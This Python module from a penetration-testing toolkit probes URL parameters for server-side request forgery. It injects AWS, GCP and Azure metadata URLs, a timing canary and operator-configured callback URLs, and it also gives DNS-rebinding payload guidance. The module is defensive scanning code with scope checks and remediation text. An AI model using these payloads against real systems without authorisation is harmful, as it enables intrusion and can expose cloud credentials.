"""PENTRIX ARSENAL module: SSRF prober.

Tests URL query parameters for server-side request forgery by injecting
cloud metadata URLs (AWS 169.254.169.254, GCP metadata.google.internal,
Azure 169.254.169.254/metadata), a non-routable timing canary, and (when
the run config provides a blind callback base) a unique callback URL per
parameter whose hits are correlated through the arsenal inbox.

Safety: the module never exfiltrates real data. Metadata probes only
look for reflection markers in the response; nothing is downloaded to
the scanner. Timing uses a non-routable canary. Blind payloads point at
the operator's own inbox listener.

Non-intrusive: a handful of GET requests per parameter.
"""

import time
import urllib.parse
from pathlib import Path
import json

from arsenal.findings import make_finding
from arsenal.http import fetch

NAME = "ssrf"
DESCRIPTION = (
    "Probes URL parameters for SSRF with cloud metadata URLs, a "
    "non-routable timing canary, blind callback correlation, and "
    "DNS-rebinding test guidance."
)
TARGET_KIND = "url"
INTRUSIVE = False

TIMEOUT = 10
MAX_PARAMS = 3

METADATA_PROBES = [
    ("aws", "http://169.254.169.254/latest/meta-data/"),
    ("gcp", "http://metadata.google.internal/computeMetadata/v1/"),
    ("azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
]

METADATA_MARKERS = (
    "ami-id", "instance-id", "computeMetadata", "Metadata-Flavor",
    "metadata.google.internal", "169.254.169.254",
)

TIMING_CANARY = "http://10.255.255.1:81/"
TIMING_THRESHOLD = 3.0


def _timeout(ctx):
    cfg = getattr(ctx, "config", None)
    if isinstance(cfg, dict):
        return cfg.get("timeout", TIMEOUT)
    if cfg is not None:
        return getattr(cfg, "timeout", TIMEOUT)
    return TIMEOUT


def _log(ctx, level, msg):
    log = getattr(ctx, "log", None)
    if log is None:
        return
    try:
        getattr(log, level, log.warning)(msg)
    except Exception:
        pass


def _is_http_url(target):
    try:
        parts = urllib.parse.urlsplit(target)
    except Exception:
        return False
    return parts.scheme in ("http", "https") and bool(parts.netloc)


def _host_of(url):
    try:
        return urllib.parse.urlsplit(url).hostname or ""
    except Exception:
        return ""


def _in_scope(target, ctx):
    scope = getattr(ctx, "scope", None)
    if scope is None:
        return True
    try:
        return bool(scope.contains(_host_of(target)))
    except Exception:
        return True


def _finding(**kwargs):
    kwargs.setdefault("module", NAME)
    return make_finding(**kwargs)


def _params(url):
    try:
        return urllib.parse.parse_qsl(urllib.parse.urlsplit(url).query,
                                      keep_blank_values=True)
    except Exception:
        return []


def _with_param(url, idx, new_value):
    parts = urllib.parse.urlsplit(url)
    q = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    q[idx] = (q[idx][0], new_value)
    return urllib.parse.urlunsplit(
        (parts.scheme, parts.netloc, parts.path,
         urllib.parse.urlencode(q), parts.fragment))


def _blind_base(ctx):
    cfg = getattr(ctx, "config", None)
    if isinstance(cfg, dict):
        return cfg.get("blind_base") or cfg.get("oob_base")
    return getattr(ctx, "blind_base", None)


def _blind_url(base, tag):
    return "%s/%s" % (str(base).rstrip("/"), tag)


def _inbox_hits(tag, since):
    """Return True when the local inbox recorded a hit for tag after since."""
    path = Path.home() / ".arsenal" / "inbox.jsonl"
    try:
        lines = path.read_text(encoding="utf-8").splitlines()
    except Exception:
        return False
    for line in lines[-200:]:
        try:
            rec = json.loads(line)
        except Exception:
            continue
        hay = "%s %s" % (rec.get("path", ""), rec.get("query", ""))
        if tag in hay and str(rec.get("ts", "")) >= since:
            return True
    return False


def _fetch(url, ctx, timeout=None):
    start = time.monotonic()
    try:
        resp = fetch(url, timeout=timeout or _timeout(ctx),
                     allow_redirects=True, ctx=ctx)
    except Exception as exc:
        _log(ctx, "debug", "%s: request failed for %s: %s" % (NAME, url, exc))
        return None, 0.0
    elapsed = time.monotonic() - start
    if resp is None:
        return None, elapsed
    return resp, elapsed


def _body_text(resp):
    _status, _headers, body, _final = resp
    try:
        return body.decode("utf-8", errors="replace")
    except Exception:
        return ""


def run(target, ctx):
    """Probe URL parameters for SSRF."""
    try:
        return _run(target, ctx)
    except Exception as exc:
        _log(ctx, "warning", "%s failed on %s: %s" % (NAME, target, exc))
        return []


def _run(target, ctx):
    if not _is_http_url(target):
        return []
    if not _in_scope(target, ctx):
        _log(ctx, "warning", "%s: target out of scope: %s" % (NAME, target))
        return []
    params = _params(target)
    if not params:
        return []
    findings = []
    base = _blind_base(ctx)

    baseline_resp, baseline_elapsed = _fetch(target, ctx)
    if baseline_resp is None:
        return []
    b_status, _b_hdrs, b_body, _b_final = baseline_resp
    baseline_len = len(b_body or b"")
    baseline_text = _body_text(baseline_resp)

    blind_tags = []
    since = time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime())

    for idx, (pname, _pval) in enumerate(params[:MAX_PARAMS]):
        # 1. Cloud metadata probes: look for reflection of fetched content.
        for provider, payload in METADATA_PROBES:
            probe_url = _with_param(target, idx, payload)
            resp, _elapsed = _fetch(probe_url, ctx)
            if resp is None:
                continue
            status, _hdrs, _body, _final = resp
            text = _body_text(resp)
            markers = [m for m in METADATA_MARKERS
                       if m in text and m not in baseline_text]
            if markers:
                findings.append(_finding(
                    target=target,
                    severity="high",
                    title="SSRF: server fetched %s metadata URL (%s)" % (provider, pname),
                    description=(
                        "The %s parameter was set to the %s cloud metadata "
                        "URL and the response contains metadata markers that "
                        "were absent from the baseline, which means the "
                        "server made the outbound request and reflected the "
                        "result." % (pname, provider)),
                    evidence=(
                        "Request: %s\n"
                        "Baseline: status=%s len=%s\n"
                        "Probe: status=%s\n"
                        "Metadata markers in response: %s"
                        % (probe_url, b_status, baseline_len, status,
                           ", ".join(markers))),
                    confidence="strong",
                    cwe="CWE-918",
                    remediation=(
                        "Validate and allowlist outbound fetch targets; block "
                        "link-local addresses (169.254.169.254, "
                        "metadata.google.internal) at the egress firewall.")))
        # 2. Non-routable timing canary.
        probe_url = _with_param(target, idx, TIMING_CANARY)
        resp, elapsed = _fetch(probe_url, ctx, timeout=8)
        if resp is not None and baseline_elapsed < 1.5 \
                and elapsed - baseline_elapsed > TIMING_THRESHOLD:
            findings.append(_finding(
                target=target,
                severity="medium",
                title="Possible blind SSRF via timing canary (%s)" % pname,
                description=(
                    "Setting %s to a non-routable address delayed the "
                    "response by %.1fs versus the baseline, which suggests "
                    "the server attempted the outbound connection. Confirm "
                    "with a collaborator callback URL." % (pname, elapsed)),
                evidence=(
                    "Request: %s\n"
                    "Baseline elapsed: %.2fs | Probe elapsed: %.2fs"
                    % (probe_url, baseline_elapsed, elapsed)),
                confidence="review",
                cwe="CWE-918",
                remediation="Same as above; confirm blind with an OOB callback."))
        # 3. Blind callback payload (only when the operator provided one).
        if base:
            tag = "ssrf-%s-%d" % (pname, idx)
            cb = _blind_url(base, tag)
            probe_url = _with_param(target, idx, cb)
            _fetch(probe_url, ctx)
            blind_tags.append((pname, tag, probe_url))

    if blind_tags:
        time.sleep(5)
        for pname, tag, probe_url in blind_tags:
            if _inbox_hits(tag, since):
                findings.append(_finding(
                    target=target,
                    severity="high",
                    title="Blind SSRF confirmed via callback (%s)" % pname,
                    description=(
                        "The server made an outbound HTTP request to the "
                        "operator-controlled callback URL injected into %s; "
                        "the hit was recorded in the arsenal inbox." % pname),
                    evidence=(
                        "Request: %s\nCallback-Tag: %s\n"
                        "Inbox hit recorded after injection."
                        % (probe_url, tag)),
                    confidence="strong",
                    cwe="CWE-918",
                    remediation=(
                        "Allowlist outbound destinations; require user "
                        "confirmation for URL-fetch features.")))

    # 4. DNS-rebinding test guidance (always useful when params exist).
    findings.append(_finding(
        target=target,
        severity="info",
        title="SSRF follow-up: DNS rebinding test guidance",
        description=(
            "If the parameter accepts arbitrary hosts, test DNS rebinding: "
            "point a domain you control at your server with a 1s TTL, then "
            "flip the A record between your IP and 127.0.0.1. Payload "
            "shape: http://127.0.0.1.<yourdomain>/ or http://<r>.nip.io/ "
            "variants. A delayed second resolution that hits localhost "
            "proves the fetch used a stale/rebound DNS answer."),
        evidence="Parameters available for rebinding tests: %s"
                % ", ".join(p[0] for p in params[:MAX_PARAMS]),
        confidence="review",
        cwe="CWE-918",
        remediation="Resolve and validate the IP at fetch time; pin the DNS answer."))
    return findings
